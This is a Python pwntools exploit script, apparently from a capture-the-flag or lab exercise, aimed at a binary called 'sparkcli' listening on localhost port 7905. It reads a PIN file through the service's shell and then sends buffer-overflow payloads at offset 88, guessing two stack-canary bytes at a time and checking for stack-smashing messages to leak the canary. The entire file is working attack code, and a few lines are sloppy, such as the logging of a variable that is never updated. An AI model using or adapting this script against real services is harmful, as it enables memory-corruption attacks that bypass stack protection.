import time

from pwn import *
context.log_level='warn'

binary = './sparkcli'

host = 'localhost'
port = 7905

IS_VERBOSE = True
IS_REMOTE = True

# Canary Bruteforce
def bf_canary(offset: int, canary: str):
    global IS_REMOTE, host, port

    if IS_REMOTE:
        p = remote(host, port) 
    else:
        p = process()

    p.recvuntil(b'$ ')
    p.sendline(b'cat pin.txt')
    PIN = p.recvuntil(b'$ ').replace(b'$ ', b'').strip()
    p.sendline(b'exit')

    payload = fit({
        0: PIN,
        offset - len(canary) - 8: canary,
    })
	
    p.sendline(payload)

    check = p.recvall()

    if IS_VERBOSE:
        print("Payload  : " + payload.decode('latin-1'))
        print("Received : " + check.decode('latin-1'), end='\n\n')

    if 'Smashing' in check.decode():
        log.failure("Bird observed ded for " + hex(n))
        return False
    else:
        log.success("Success with " + hex(n))
        return True


# Payload creation
offset = 88

bfBytes = []

n = 0
canary = ''
for i in range(0x10000):
    byte1 = i & 0xFF
    byte2 = (i >> 8) & 0xFF
    
    test_bytes = chr(byte1) + chr(byte2)
    print(f"Testing: 0x{byte2:02x} 0x{byte1:02x}")
    
    ret = bf_canary(offset, test_bytes)
    
    if ret:
        canary = test_bytes
        bfBytes = [byte1, byte2]
        print(f"Found canary bytes: 0x{byte2:02x} 0x{byte1:02x}")
        break
    
    time.sleep(0.2)

print()
print("Leaked Canary: " + canary)
